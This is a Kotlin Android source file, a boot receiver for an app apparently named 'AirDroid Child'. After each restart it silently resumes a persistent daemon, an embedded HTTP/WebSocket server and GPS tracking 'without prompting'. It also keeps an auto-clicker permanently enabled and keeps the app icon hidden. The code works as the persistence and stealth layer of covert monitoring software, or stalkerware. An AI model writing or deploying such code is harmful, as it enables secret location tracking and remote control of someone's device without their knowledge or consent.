package com.example.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.PowerManager
import android.util.Log
import com.example.AirDroidChildApp
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class DaemonBootReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "DaemonBootReceiver"
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null) return
        val action = intent?.action ?: return

        Log.i(TAG, "Received system broadcast: $action. Initiating silent background restart...")

        val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
        val wakeLock = powerManager?.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "AirDroidChild:BootWakeLock"
        )
        wakeLock?.acquire(15000L) // hold wakelock for 15s to guarantee service initialization

        try {
            // 1. Start Persistent Daemon Foreground Service
            AirDroidDaemonService.startService(context)

            // 2. Start Embedded HTTP / WebSocket Daemon Server
            AirDroidChildApp.daemonServer?.startServer()

            // 3. Re-engage Location Tracking without prompting
            AirDroidChildApp.locationManager?.startTracking()

            // 4. Ensure Auto-Clicker is permanently enabled
            AirDroidChildApp.stealthManager?.setAutoClickerActive(true)

            // 5. Ensure Stealth / Icon Hiding state is maintained
            val isIconHidden = AirDroidChildApp.stealthManager?.isAppIconHidden?.value ?: false
            if (isIconHidden) {
                AirDroidChildApp.stealthManager?.setAppIconHidden(true)
            }

            // 6. Record Audit Log
            CoroutineScope(Dispatchers.IO).launch {
                AirDroidChildApp.repository?.logAction(
                    "DEVICE_BOOT_RESTART_AUTO_RESUMED",
                    "Device restarted ($action). AirDroid daemon, server, GPS & auto-clicker resumed silently without prompting.",
                    isSuccess = true
                )
            }

            Log.i(TAG, "AirDroid Child background services successfully auto-started post-boot.")
        } catch (e: Exception) {
            Log.e(TAG, "Error in DaemonBootReceiver onReceive", e)
        } finally {
            try {
                if (wakeLock?.isHeld == true) {
                    wakeLock.release()
                }
            } catch (_: Exception) {}
        }
    }
}
